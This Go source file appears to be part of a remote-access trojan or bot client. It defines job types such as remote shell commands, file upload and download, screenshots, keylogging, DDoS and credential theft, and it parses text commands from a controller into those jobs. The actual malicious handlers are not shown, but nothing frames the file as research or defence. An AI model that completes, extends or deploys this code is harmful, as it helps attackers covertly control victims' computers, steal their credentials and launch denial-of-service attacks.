package main

import (
	"Worker/utils"
	"sort"
	"time"
)

type Job struct {
	Id      int       `json:"id"`
	Todo    string    `json:"todo"`
	IsDone  bool      `json:"is_done"`
	Created time.Time `json:"created"`
}

type JobType int

const (
	UNKNOWN JobType = iota
	SHELL_CMD
	UPLOAD
	DOWNLOAD
	CHDIR
	SLEEP
	BOOST
	SCREENSHOT
	KEYLOGGER
	DDOS
	CREDENTIALS
	MSG
)

type JobTypeInfo struct {
	jtype JobType
	argsN int
	// maybe also add handler function
}

var jobTypesMap = map[string]*JobTypeInfo{
	"cmd": {
		jtype: SHELL_CMD,
		argsN: -1,
	},
	"upload": {
		jtype: UPLOAD,
		argsN: 1,
	},
	"download": {
		jtype: DOWNLOAD,
		argsN: 2,
	},
	"sleep": {
		jtype: SLEEP,
		argsN: 1,
	},
	"boost": {
		jtype: BOOST,
		argsN: 1,
	},
	"chdir": {
		jtype: CHDIR,
		argsN: 1,
	},
	"msg": {
		jtype: MSG,
		argsN: 2,
	},
	"shot": {
		jtype: SCREENSHOT,
		argsN: 0,
	},
}

func (j *Job) parse() (JobType, []string) {
	values := utils.SplitArgsStr(j.Todo)
	if len(values) == 0 {
		return UNKNOWN, nil
	}
	jobType := values[0]
	jobArgs := values[1:]
	jobTypeInfo, ok := jobTypesMap[jobType]
	if !ok {
		return UNKNOWN, nil
	}
	if jobTypeInfo.argsN == -1 || jobTypeInfo.argsN == len(jobArgs) {
		return jobTypeInfo.jtype, jobArgs
	}
	return UNKNOWN, nil
}

func sortJobsByTime(jobs []Job) {
	sort.Slice(jobs, func(i, j int) bool {
		return jobs[i].Created.Before(jobs[j].Created)
	})
}
